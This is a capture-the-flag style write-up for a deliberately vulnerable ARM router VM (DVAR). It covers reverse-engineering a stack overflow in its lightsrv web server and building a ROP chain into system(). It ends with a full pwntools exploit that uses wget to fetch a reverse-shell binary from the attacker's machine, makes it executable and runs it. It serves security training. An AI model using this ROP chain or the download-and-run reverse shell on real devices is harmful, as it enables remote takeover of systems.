<h1 id="dvar-bonus-round">DVAR bonus round</h1>
<p>http://blog.exploitlab.net/2018/03/dvar-rop-challenge-bonus-round-unlocked.html</p>
<h2 id="challenge-description">Challenge description:</h2>
<p>Part 2 of the DVAR challenge is to exploit a stack overflow in “/usr/bin/lightsrv” the traffic signal lights server. lightsrv is automatically started on boot, and listens on port 8080.</p>
<p>Your task is:</p>
<ol type="1">
<li>Find the buffer overflow vector for lightsrv</li>
<li>Crash the program and get pc=0x41414140</li>
<li>Work your way through building a proper ROP chain (XN is enabled!)</li>
<li>Get a working shell!</li>
</ol>
<p>Hints:</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb1-1" data-line-number="1"><span class="ex">exploitlab-DVAR</span>:~# ps</a>
<a class="sourceLine" id="cb1-2" data-line-number="2">  <span class="ex">PID</span> USER  VSZ STAT COMMAND</a>
<a class="sourceLine" id="cb1-3" data-line-number="3">    <span class="bu">:</span>    :    : :    :</a>
<a class="sourceLine" id="cb1-4" data-line-number="4">  <span class="ex">245</span> root  656 S    /usr/bin/miniweb</a>
<a class="sourceLine" id="cb1-5" data-line-number="5">  <span class="ex">246</span> root  640 S    /usr/bin/lightsrv <span class="op">&lt;</span>------- [TARGET]</a>
<a class="sourceLine" id="cb1-6" data-line-number="6">  <span class="ex">292</span> root 1016 S    -ash</a>
<a class="sourceLine" id="cb1-7" data-line-number="7">  <span class="ex">321</span> root 1012 R    ps</a></code></pre></div>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb2-1" data-line-number="1"><span class="ex">exploitlab-DVAR</span>:~# cat /proc/<span class="va">$(</span><span class="fu">pidof</span> lightsrv<span class="va">)</span>/maps</a>
<a class="sourceLine" id="cb2-2" data-line-number="2"><span class="ex">00010000-00012000</span> r-xp 00000000 08:00 512   /usr/bin/lightsrv</a>
<a class="sourceLine" id="cb2-3" data-line-number="3"><span class="ex">00022000-00023000</span> rw-p 00002000 08:00 512   /usr/bin/lightsrv</a>
<a class="sourceLine" id="cb2-4" data-line-number="4"><span class="ex">40000000-40064000</span> r-xp 00000000 08:00 185   /lib/libc.so</a>
<a class="sourceLine" id="cb2-5" data-line-number="5"><span class="ex">40064000-40065000</span> r-xp 00000000 00:00 0     [sigpage]</a>
<a class="sourceLine" id="cb2-6" data-line-number="6"><span class="ex">40073000-40074000</span> r--p 00063000 08:00 185   /lib/libc.so</a>
<a class="sourceLine" id="cb2-7" data-line-number="7"><span class="ex">40074000-40075000</span> rw-p 00064000 08:00 185   /lib/libc.so</a>
<a class="sourceLine" id="cb2-8" data-line-number="8"><span class="ex">40075000-40077000</span> rw-p 00000000 00:00 0</a>
<a class="sourceLine" id="cb2-9" data-line-number="9"><span class="ex">40078000-40089000</span> r-xp 00000000 08:00 2791  /lib/libgcc_s.so.1</a>
<a class="sourceLine" id="cb2-10" data-line-number="10"><span class="ex">40089000-4008a000</span> rw-p 00009000 08:00 2791  /lib/libgcc_s.so.1</a>
<a class="sourceLine" id="cb2-11" data-line-number="11"><span class="ex">befdf000-bf000000</span> rw-p 00000000 00:00 0     [stack]</a>
<a class="sourceLine" id="cb2-12" data-line-number="12"><span class="ex">ffff0000-ffff1000</span> r-xp 00000000 00:00 0     [vectors]</a></code></pre></div>
<p>If you haven’t played with DVAR yet, download it from here:</p>
<p>http://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html</p>
<h2 id="lookin-at-it">Lookin at it</h2>
<p>Based on the description we can already see that stack isnt executable. We can also see that ASLR is disabled. (always good to double check though)</p>
<p>Lightsrv is a http server, and our input must be a “valid” HTTP GET request</p>
<pre><code>GET / SOME DATA \n\n</code></pre>
<p>I transferred the binary to my host machine and took a look at it with radare2. The description (and the exploitlab class) implies that it has a stack overflow.</p>
<p>The DVAR vm also has gdbserver on it, so that makes it nice and easy to debug. Radare2 supports connecting to gdbserver (kinda buggy), but it worked well in this case, so I used that instead of gdb-gef.</p>
<p>One thing that made this challenge slightly annoying was that lightsrv directly wrote to /dev/console instead of stdout.</p>
<figure>
<img src="https://i.imgur.com/Jza5Exv.png" alt="fopen /dev/console" /><figcaption>fopen /dev/console</figcaption>
</figure>
<p>First thing i did was look for functions that have large stack arrays.</p>
<figure>
<img src="https://i.imgur.com/lR0j0sd.png" alt="sym.handle_single_request" /><figcaption>sym.handle_single_request</figcaption>
</figure>
<p>After playing around with debugging and reverse engineering sym.handle_single_request, i found some key things.</p>
<ul>
<li>loops, uses recv to read 0x800 bytes into obj.buf, then appends it to the (0x1000 sized) buffer on the stack.
<ul>
<li>Doesnt limit the number of times it will append to the end of the buffer, so the ol’ give it AAAAAAAAAAAAAAAA trick weill eventually overwrite saved lr.</li>
<li>Also ignored everthing before the slash in “GET /”.</li>
</ul></li>
<li>uses recv (so nulls, spaces, etc are fine)</li>
</ul>
<p>There is also a very nice little part of code in sym.handle_led_cmd that calls libc’s system for us.</p>
<figure>
<img src="https://i.imgur.com/jZXGwhk.png" alt="calls system" /><figcaption>calls system</figcaption>
</figure>
<p>At this point, the exploit seems very simple compared to the sort of stuff that was normally taught in class.</p>
<ul>
<li>Overflow in sym.handle_single_request, overwrite PC
<ul>
<li>Also put the command we want to execute somewhere in there, so it gets in obj.buf</li>
</ul></li>
<li>ROP to get the address of obj.buf(0x000221d0) into r0</li>
<li>ROP into sym.handle_led_cmd at bl sym.imp.system (0x00010e08)</li>
</ul>
<p>Since nullies are allowed in our input, we can direclty include low addresses without any tricky xor nonsense. We can have very a very simple rop chain that only uses the lightsrv binary. This means our rop chain will also survive enabling ASLR, as lightsrv is not PIE. This is mostly because I was lazy and didnt want to SCP over the libc from DVAR.</p>
<p>lightsrv contains a very nice gadget for setting r0.</p>
<figure>
<img src="https://i.imgur.com/iQdQAve.png" alt="pop r0" /><figcaption>pop r0</figcaption>
</figure>
<p>R2’s gadget search is also nice, and applies the static binary offset.</p>
<figure>
<img src="https://i.imgur.com/91mkS6D.png" alt="pop r0" /><figcaption>pop r0</figcaption>
</figure>
<p>My chain ended up being this cute little thing:</p>
<pre><code>0x00010940 #: pop (r0, lr); bx lr
0x000221d0 #: address of the obj.buf (will get placed into r0)
0x00010e28 #: bl sym.imp.system in sym.handle_led_cmd</code></pre>
<p>The only thing that is left to get arbitrary command exeuction is get our command string aligned so that it fits right in obj.buf. I basically just did this through trial and error, but a cyclic pattern would’ve helped a lot here. My input turned out to give me 36 bytes of space to put the command before overwriting saved lr. I probably could’ve fiddled with adding spaced in between GET and / to get a different offset, but 36 was enough.</p>
<p>Because the ‘nc’ command on the DVAR vm is a special busybox version instead of a full netcat, it does not allow for easy reverse shells. DVAR does come with wget, so i just planned to abuse that to download a reverse shell binary and then later run it. I ended up using one of the reverse shells that we had made in the class.</p>
<p>This challenge turned out to be surprisingly simple. I had started it assuming I would have to write a full ropchain for a mprotect stack style exploit, full with no nulls, newlines, and spaces allowed.</p>
<h2 id="exploit">exploit</h2>
<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb5-1" data-line-number="1"><span class="co">#!/usr/bin/python2</span></a>
<a class="sourceLine" id="cb5-2" data-line-number="2"><span class="co">#for hosting a http server to DL from</span></a>
<a class="sourceLine" id="cb5-3" data-line-number="3"><span class="im">import</span> SimpleHTTPServer</a>
<a class="sourceLine" id="cb5-4" data-line-number="4"><span class="im">import</span> SocketServer</a>
<a class="sourceLine" id="cb5-5" data-line-number="5"><span class="co">#and ye olden pwntools</span></a>
<a class="sourceLine" id="cb5-6" data-line-number="6"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
<a class="sourceLine" id="cb5-7" data-line-number="7"></a>
<a class="sourceLine" id="cb5-8" data-line-number="8"><span class="kw">def</span> httpserv():</a>
<a class="sourceLine" id="cb5-9" data-line-number="9">    httpd <span class="op">=</span> SocketServer.TCPServer((<span class="st">&quot;&quot;</span>, <span class="dv">8000</span>), SimpleHTTPServer.SimpleHTTPRequestHandler)</a>
<a class="sourceLine" id="cb5-10" data-line-number="10">    <span class="bu">print</span> <span class="st">&quot;serving at port&quot;</span>, <span class="dv">8000</span></a>
<a class="sourceLine" id="cb5-11" data-line-number="11">    httpd.serve_forever()</a>
<a class="sourceLine" id="cb5-12" data-line-number="12"></a>
<a class="sourceLine" id="cb5-13" data-line-number="13"></a>
<a class="sourceLine" id="cb5-14" data-line-number="14"></a>
<a class="sourceLine" id="cb5-15" data-line-number="15"><span class="kw">def</span> execmd(command):</a>
<a class="sourceLine" id="cb5-16" data-line-number="16">        <span class="co">##ip of the dvar</span></a>
<a class="sourceLine" id="cb5-17" data-line-number="17">    s <span class="op">=</span> remote(<span class="st">&#39;172.16.99.129&#39;</span>, <span class="st">&#39;8080&#39;</span>)<span class="op">;</span></a>
<a class="sourceLine" id="cb5-18" data-line-number="18">    s.send(<span class="st">&#39;GET /&#39;</span> <span class="op">+</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="bn">0xffb</span>)<span class="op">;</span></a>
<a class="sourceLine" id="cb5-19" data-line-number="19">    buf <span class="op">=</span> command <span class="op">+</span> <span class="st">&#39;A&#39;</span> <span class="op">*</span> (<span class="dv">36</span> <span class="op">-</span> <span class="bu">len</span>(command))<span class="op">;</span></a>
<a class="sourceLine" id="cb5-20" data-line-number="20">    s.send(buf)<span class="op">;</span></a>
<a class="sourceLine" id="cb5-21" data-line-number="21">    s.send(p32(<span class="bn">0x00010940</span>))<span class="op">;</span> <span class="co">#: pop (r0, lr); bx lr</span></a>
<a class="sourceLine" id="cb5-22" data-line-number="22">    s.send(p32(<span class="bn">0x221d0</span>))<span class="op">;</span> <span class="co">#: address of the temporary buffer</span></a>
<a class="sourceLine" id="cb5-23" data-line-number="23">    s.send(p32(<span class="bn">0x10e28</span>))<span class="op">;</span> <span class="co">#: bl sym.imp.system</span></a>
<a class="sourceLine" id="cb5-24" data-line-number="24">    s.send(<span class="st">&#39;d&#39;</span><span class="op">*</span><span class="dv">4</span>)<span class="op">;</span></a>
<a class="sourceLine" id="cb5-25" data-line-number="25">    s.send(<span class="st">&#39;</span><span class="ch">\n\n</span><span class="st">&#39;</span>)<span class="op">;</span></a>
<a class="sourceLine" id="cb5-26" data-line-number="26">    s.close()<span class="op">;</span></a>
<a class="sourceLine" id="cb5-27" data-line-number="27"></a>
<a class="sourceLine" id="cb5-28" data-line-number="28"><span class="kw">def</span> sploit():</a>
<a class="sourceLine" id="cb5-29" data-line-number="29">    sleep(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb5-30" data-line-number="30">    <span class="bu">print</span>(<span class="st">&#39;downloading reverse shell&#39;</span>)</a>
<a class="sourceLine" id="cb5-31" data-line-number="31">    execmd(<span class="st">&#39;wget http://172.16.99.1:8000/r</span><span class="ch">\0</span><span class="st">&#39;</span>)</a>
<a class="sourceLine" id="cb5-32" data-line-number="32">    sleep(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb5-33" data-line-number="33">    <span class="bu">print</span>(<span class="st">&#39;setting execute&#39;</span>)</a>
<a class="sourceLine" id="cb5-34" data-line-number="34">    execmd(<span class="st">&#39;chmod +x ./r</span><span class="ch">\0</span><span class="st">&#39;</span>)</a>
<a class="sourceLine" id="cb5-35" data-line-number="35">    sleep(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb5-36" data-line-number="36">    <span class="bu">print</span>(<span class="st">&#39;starting reverse shell&#39;</span>)</a>
<a class="sourceLine" id="cb5-37" data-line-number="37">    execmd(<span class="st">&#39;./r</span><span class="ch">\0</span><span class="st">&#39;</span>)</a>
<a class="sourceLine" id="cb5-38" data-line-number="38"></a>
<a class="sourceLine" id="cb5-39" data-line-number="39"><span class="co">#need to run the http server at the same time we issue &quot;commands&quot; to the lightsrv</span></a>
<a class="sourceLine" id="cb5-40" data-line-number="40"><span class="im">from</span> pwnlib.context <span class="im">import</span> Thread <span class="im">as</span> PwnThread</a>
<a class="sourceLine" id="cb5-41" data-line-number="41"></a>
<a class="sourceLine" id="cb5-42" data-line-number="42">PwnThread(target<span class="op">=</span>httpserv).start()</a>
<a class="sourceLine" id="cb5-43" data-line-number="43">PwnThread(target<span class="op">=</span>sploit).start()</a>
<a class="sourceLine" id="cb5-44" data-line-number="44">l <span class="op">=</span> listen(<span class="dv">26985</span>)</a>
<a class="sourceLine" id="cb5-45" data-line-number="45">l.wait_for_connection()</a>
<a class="sourceLine" id="cb5-46" data-line-number="46">l.interactive()</a></code></pre></div>
<h2 id="fin">fin</h2>
<p>Thanks to Saumil Shah for the excelent class and take-home challenge. It was a blast.</p>
